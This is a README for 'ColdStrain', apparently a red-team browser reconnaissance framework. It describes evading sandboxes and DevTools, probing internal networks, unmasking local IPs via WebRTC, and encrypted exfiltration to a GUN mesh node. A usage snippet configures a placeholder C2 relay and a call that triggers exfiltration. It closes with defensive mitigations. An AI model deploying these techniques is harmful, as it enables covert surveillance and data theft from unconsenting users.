# ColdStrain

**Advanced Browser-Based Reconnaissance & Environment Mapping Framework**

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
![Type](https://img.shields.io/badge/type-Reconnaissance-red.svg)
![Status](https://img.shields.io/badge/status-PoC-yellow.svg)

## STRICT LEGAL DISCLAIMER
**ColdStrain is strictly for educational purposes and authorized Red Team operations.** This framework demonstrates advanced browser API exploitation to map internal networks, bypass privacy controls, and exfiltrate environment telemetry. It is provided "as-is" to assist security researchers and blue teams in understanding the current landscape of client-side reconnaissance. 

**DO NOT** deploy this payload on systems, networks, or applications for which you do not have explicit, documented permission. The author(s) and contributors assume no liability for misuse, unauthorized access, or damage caused by this software. 

---

## Overview

**ColdStrain is a web based reconnaissance tool.**

While traditional browser "fingerprinting" aims to passively identify and track a user across multiple sessions for advertising purposes, ColdStrain is an active, offensive reconnaissance agent. Its primary objective is to execute securely within a target's browser, map their local network topology, assess their defensive posture (VPNs, Proxies, VMs), profile hardware capabilities, and exfiltrate the intelligence stealthily.

It is designed to give Red Teams deep visibility into a target's environment once a client-side execution vector (such as Stored XSS, phishing, or a compromised dependency) is achieved.

## Key Capabilities

### Defense Evasion & Anti-Analysis
ColdStrain employs self-preservation mechanics to avoid detection by sandbox environments, automated scanners, and curious developers.
* **DevTools Shielding:** Continuously monitors for the presence of Browser Developer Tools using timing attacks against `debugger` statements. If DevTools is opened, the framework instantly hot-swaps critical payload functions with benign "noise" logic.
* **Human-Interaction Gating:** The payload can be armed via `armOnMultiInteraction()`, ensuring execution only occurs after a verified, complex human interaction chain (`mousemove` ➔ `scroll` ➔ `click`). This effectively bypasses headless browsers and automated malware analysis sandboxes.

### Deep Network & LAN Reconnaissance
* **WebRTC & mDNS Unmasking:** Harvests ICE candidates to discover local interfaces and public IPs. Capable of bypassing modern mDNS masking (`.local` addresses) by strategically prompting for device hardware (e.g., microphone), forcing the browser to unlock raw local IPs for WebRTC configuration.
* **Internal Gateway Probing:** Actively maps the target's internal subnet by guessing standard gateways (e.g., `192.168.1.1`, `10.0.0.1`) and verifying their existence using a combination of CORS `fetch` probes and iframe navigation timing bypasses.
* **NAT Topology Profiling:** Analyzes ICE candidate ports to determine if the target is behind a Symmetric (Corporate/Strict) or Cone (Home) NAT.

### ️Environment & Hardware Profiling
* **VPN & Proxy Unmasking:** Detects IP masking by correlating system-level timezones (`Intl.DateTimeFormat`) with IP-based geolocation data. Also utilizes Anycast DNS latency measurements to identify likely proxy usage.
* **Virtualization Detection:** Profiles WebGL/WebGPU renderers and network interface patterns to identify if the target is operating within a Virtual Machine (VMware, VirtualBox, QEMU).
* **Deep Media Telemetry:** Evaluates hardware-level audio configurations, sample rates, and noise-cancellation hardware profiles.

### Encrypted & Decentralized Exfiltration
* **Decentralized Syncing:** ColdStrain does not use standard, easily blocked `POST` requests to a C2 server. Instead, it utilizes **GUN**, a decentralized graph database protocol, making exfiltration traffic resemble peer-to-peer WebSocket data.
* **Hybrid Encryption:** Payloads are chunked (to evade Deep Packet Inspection) and encrypted client-side using **AES-256-GCM**, with the AES key wrapped via **RSA-2048 (OAEP)**. Only the Red Team holding the private RSA key can decrypt the telemetry.

---

## Deployment (Red Team Usage)

To integrate ColdStrain into a campaign payload, instantiate the class and decide whether to arm it immediately or wait for human interaction.

```javascript
import c43br3c5 from './ColdStrain.js';

// 1. Initialize the framework
const reconAgent = new c43br3c5({
    stunServers: [
        'stun:stun.l.google.com:19302',
        'stun:global.stun.twilio.com:3478'
    ],
    peers: ['[https://your-gun-relay-node.com/gun](https://your-gun-relay-node.com/gun)'] // Set your C2 mesh node
});

// 2. Tactic A: Arm stealthily (waits for human interaction chain to execute)
reconAgent.armOnMultiInteraction();

// 2. Tactic B: Force immediate execution and mesh sync
// reconAgent.syncToMesh().then(success => {
//     console.log(success ? "Exfil complete" : "Exfil failed/blocked");
// });
```

### Decrypting the Intelligence
Because ColdStrain utilizes Hybrid Encryption, the exfiltrated JSON chunks stored on your GUN mesh node must be reassembled and decrypted using your private RSA key (matching the public key embedded in the `syncToMesh` function).

---

### Blue Team / Mitigation Strategies

Understanding how ColdStrain operates is critical for defending against it. To mitigate advanced browser recon frameworks:

1. **Disable WebRTC / IP Leaks:** Enforce browser policies (via GPO or MDM) to disable WebRTC entirely, or restrict it to only use proxy interfaces (`iceTransportPolicy: 'relay'`).
2. **Restrict Media Device Access:** Ensure strict permissions are required for `getUserMedia`. ColdStrain relies on media prompts to bypass mDNS local IP masking.
3. **Monitor Outbound WebSockets:** Standard EDRs may miss this as the exfiltration occurs natively over the browser's TLS connection. Blue teams should monitor for anomalous, long-lived WebSocket connections to unknown decentralized nodes.
4. **Network Segmentation:** Ensure client subnets cannot arbitrarily route to internal administrative gateways or sensitive subnets, mitigating the LAN probing techniques.

---
*Created for adversary simulation and the continuous improvement of client-side security.*
